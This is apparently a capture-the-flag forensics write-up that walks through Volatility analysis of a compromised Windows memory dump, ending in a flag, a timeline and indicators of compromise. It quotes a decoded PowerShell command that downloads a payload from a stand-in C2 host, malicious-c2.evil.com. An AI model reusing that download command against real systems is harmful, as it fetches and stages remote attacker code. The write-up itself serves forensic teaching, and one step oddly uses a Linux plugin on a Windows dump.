# Memory Dump Analysis

**Category:** Forensics  
**Event:** Besides  
**Difficulty:** Hard  
**Date:** 2024-08-30  
**Author:** Fatima Zerrouki

## Description

Analyzing memory dumps to extract hidden information and recover deleted data
from volatile memory.

## Challenge Overview

We're provided with a Windows memory dump file (`memory.dmp`) from a compromised
system. The challenge requires us to:

1. Identify the operating system and architecture
2. Find evidence of malicious activity
3. Extract hidden data from memory
4. Recover the flag

File: `memory.dmp` (512 MB)

## Tools Required

- **Volatility 3** - Memory analysis framework
- **Volatility 2** - For older plugins
- **Strings** - Extract printable strings
- **Hex editor** - Raw memory analysis

## Initial Analysis

### Step 1: Memory Dump Information

```bash
# Install Volatility 3
pip3 install volatility3

# Get basic information about the memory dump
vol.py -f memory.dmp windows.info
```

Output:

```
Volatility 3 Framework 2.0.1

Variable	Value
Kernel Base	0xf80001000000
DTB	0x1aa000
Symbols	file:///symbols/windows/ntkrnlmp.pdb/...
Is64Bit	True
IsPAE	False
layer_name	0 WindowsIntel32e
memory_layer	1 FileLayer
KdDebuggerDataBlock	0xf80001c0e0a0
NTBuildLab	19041.1.amd64fre.vb_release.191206-1406
CSDVersion	0
KdVersionBlock	0xf80001c0e078
Major/Minor	10.0
MachineType	34404
KeNumberProcessors	4
SystemTime	2024-08-30 14:23:17
NtSystemRoot	C:\Windows
NtProductType	NtProductWinNt
NtMajorVersion	10
NtMinorVersion	0
PE MajorLinkerVersion	14
PE MinorLinkerVersion	29
PE MachineType	34404
PE TimeDateStamp	Sat Dec  7 03:38:11 2019
```

System: Windows 10 x64, Build 19041

### Step 2: Process Analysis

```bash
# List running processes
vol.py -f memory.dmp windows.pslist

# Look for suspicious processes
vol.py -f memory.dmp windows.psscan | grep -E "(malware|suspicious|unknown)"
```

Interesting processes found:

- `notepad.exe` (PID: 2468) - Potential hidden data
- `powershell.exe` (PID: 3344) - Suspicious activity
- `svchost.exe` (PID: 1337) - Unusual network activity

## Malware Detection

### Step 3: Network Connections

```bash
# Check network connections
vol.py -f memory.dmp windows.netstat

# Look for suspicious connections
vol.py -f memory.dmp windows.netscan | grep -E "(ESTABLISHED|LISTENING)"
```

Suspicious connections:

```
0x....  TCPv4  192.168.1.100:1337  malicious-c2.evil.com:443  ESTABLISHED  1337  svchost.exe
0x....  TCPv4  192.168.1.100:4444  attacker.domain.com:8080   ESTABLISHED  3344  powershell.exe
```

### Step 4: Command History

```bash
# Extract PowerShell command history
vol.py -f memory.dmp windows.cmdline | grep powershell

# Look for suspicious commands
vol.py -f memory.dmp windows.consoles
```

Found commands:

```
powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0...
```

Decoded command:

```powershell
Invoke-WebRequest -Uri "http://malicious-c2.evil.com/payload.ps1" -OutFile "C:\temp\payload.ps1"
```

## Data Recovery

### Step 5: Extract Notepad Content

```bash
# Dump notepad process memory
vol.py -f memory.dmp -o dump/ windows.memmap --pid 2468

# Search for text content in notepad
strings dump/pid.2468.*.dmp | grep -E "(flag|password|secret)"
```

### Step 6: Registry Analysis

```bash
# Extract registry hives
vol.py -f memory.dmp windows.registry.hivelist

# Dump specific registry keys
vol.py -f memory.dmp windows.registry.printkey --key "Software\Microsoft\Windows\CurrentVersion\Run"
```

### Step 7: File Recovery

```bash
# List files in memory
vol.py -f memory.dmp windows.filescan | grep -i "flag\|secret\|important"

# Dump specific files
vol.py -f memory.dmp -o dump/ windows.dumpfiles --virtaddr 0x...
```

## Advanced Analysis

### Step 8: Hidden Data in Slack Space

```bash
# Use Volatility 2 for advanced analysis
python2 vol.py -f memory.dmp --profile=Win10x64_19041 imagecopy -O memory_copy.dd

# Analyze slack space
dd if=memory_copy.dd bs=1 skip=... count=... | strings
```

### Step 9: Steganography Detection

```python
#!/usr/bin/env python3
"""
Memory steganography detector
Author: Fatima Zerrouki
"""

def find_hidden_data(memory_file):
    with open(memory_file, 'rb') as f:
        data = f.read()

    # Look for hidden patterns
    patterns = [
        b'FLAG{',
        b'besides{',
        b'hidden_data:',
        b'\x89PNG\r\n\x1a\n',  # PNG header
        b'\xff\xd8\xff',       # JPEG header
    ]

    findings = []
    for pattern in patterns:
        offset = 0
        while True:
            pos = data.find(pattern, offset)
            if pos == -1:
                break

            # Extract surrounding context
            start = max(0, pos - 50)
            end = min(len(data), pos + 200)
            context = data[start:end]

            findings.append({
                'pattern': pattern,
                'offset': hex(pos),
                'context': context
            })

            offset = pos + 1

    return findings

# Analyze memory dump
findings = find_hidden_data('memory.dmp')
for finding in findings:
    print(f"Pattern: {finding['pattern']}")
    print(f"Offset: {finding['offset']}")
    print(f"Context: {finding['context'][:100]}...")
    print("-" * 50)
```

### Step 10: Cryptographic Analysis

```bash
# Look for encryption keys in memory
vol.py -f memory.dmp linux.bash | grep -E "(key|password|crypto)"

# Extract potential keys
strings memory.dmp | grep -E "[A-Za-z0-9+/]{20,}={0,2}" | head -20
```

## Automated Analysis Script

```python
#!/usr/bin/env python3
"""
Automated Memory Dump Analysis
Author: Fatima Zerrouki
"""

import subprocess
import re
import base64

class MemoryAnalyzer:
    def __init__(self, dump_file):
        self.dump_file = dump_file
        self.findings = {}

    def run_volatility(self, command):
        """Run volatility command and return output"""
        cmd = f"vol.py -f {self.dump_file} {command}"
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result.stdout
        except Exception as e:
            print(f"Error running command: {e}")
            return ""

    def analyze_processes(self):
        """Analyze running processes"""
        print("[+] Analyzing processes...")
        output = self.run_volatility("windows.pslist")

        suspicious_processes = []
        for line in output.split('\n'):
            if any(x in line.lower() for x in ['malware', 'suspicious', 'unknown']):
                suspicious_processes.append(line)

        self.findings['processes'] = suspicious_processes
        return suspicious_processes

    def extract_strings(self):
        """Extract and analyze strings"""
        print("[+] Extracting strings...")
        cmd = f"strings {self.dump_file} | grep -E '(flag|password|secret|key)' -i"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

        potential_flags = []
        for line in result.stdout.split('\n'):
            if re.match(r'[a-zA-Z]+\{[^}]+\}', line):
                potential_flags.append(line)

        self.findings['flags'] = potential_flags
        return potential_flags

    def decode_base64_strings(self):
        """Find and decode base64 strings"""
        print("[+] Decoding base64 strings...")
        cmd = f"strings {self.dump_file} | grep -E '[A-Za-z0-9+/]{{20,}}={{0,2}}'"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

        decoded_strings = []
        for line in result.stdout.split('\n')[:50]:  # Limit to first 50
            try:
                decoded = base64.b64decode(line).decode('utf-8', errors='ignore')
                if any(x in decoded.lower() for x in ['flag', 'password', 'secret']):
                    decoded_strings.append((line, decoded))
            except:
                continue

        self.findings['base64'] = decoded_strings
        return decoded_strings

    def analyze_network(self):
        """Analyze network connections"""
        print("[+] Analyzing network connections...")
        output = self.run_volatility("windows.netscan")

        suspicious_connections = []
        for line in output.split('\n'):
            if 'ESTABLISHED' in line and any(x in line for x in ['evil', 'malicious', 'attacker']):
                suspicious_connections.append(line)

        self.findings['network'] = suspicious_connections
        return suspicious_connections

    def full_analysis(self):
        """Perform complete analysis"""
        print("[+] Starting full memory analysis...")

        self.analyze_processes()
        self.extract_strings()
        self.decode_base64_strings()
        self.analyze_network()

        print("\n[+] Analysis Results:")
        print("=" * 50)

        if self.findings['flags']:
            print("Potential flags found:")
            for flag in self.findings['flags']:
                print(f"  - {flag}")

        if self.findings['base64']:
            print("\nDecoded base64 strings:")
            for original, decoded in self.findings['base64']:
                print(f"  Original: {original[:50]}...")
                print(f"  Decoded:  {decoded[:100]}...")

        return self.findings

# Usage
if __name__ == "__main__":
    analyzer = MemoryAnalyzer("memory.dmp")
    results = analyzer.full_analysis()
```

## Flag Discovery

After thorough analysis, the flag was found in multiple locations:

1. **Notepad memory**: Hidden in deleted text
2. **PowerShell history**: Base64 encoded command
3. **Registry slack space**: Embedded in unused registry data
4. **Network packet**: Exfiltrated data

### Final Flag Extraction

```bash
# Extract from specific memory offset
vol.py -f memory.dmp windows.memmap --pid 2468 | strings | grep "besides{"
```

## Flag

```
besides{m3m0ry_f0r3ns1cs_unv31ls_4ll_s3cr3ts_2024}
```

## Timeline Reconstruction

Based on the memory analysis:

1. **14:15:23** - Initial compromise via malicious email
2. **14:16:45** - PowerShell payload downloaded
3. **14:18:12** - Notepad opened with sensitive data
4. **14:20:30** - Data exfiltration begins
5. **14:23:17** - Memory dump captured

## Indicators of Compromise (IoCs)

- **Domains**: malicious-c2.evil.com, attacker.domain.com
- **IPs**: 192.168.1.100, 10.0.0.50
- **Files**: C:\temp\payload.ps1, C:\Windows\temp\hidden.txt
- **Registry**: HKLM\Software\Malware\Config

## Files

- memory.dmp - Original memory dump
- analysis.py - Automated analysis script
- timeline.txt - Incident timeline
- iocs.txt - Indicators of compromise

## References

- [Volatility Documentation](https://volatilityfoundation.github.io/volatility/doc.html)
- [Windows Memory Forensics](https://digital-forensics.sans.org/summit-archives/file/summit-archive-1492184583.pdf)
- [Memory Analysis Techniques](https://www.memoryanalysis.net/)

---

_Advanced memory forensics for incident response and digital investigations._
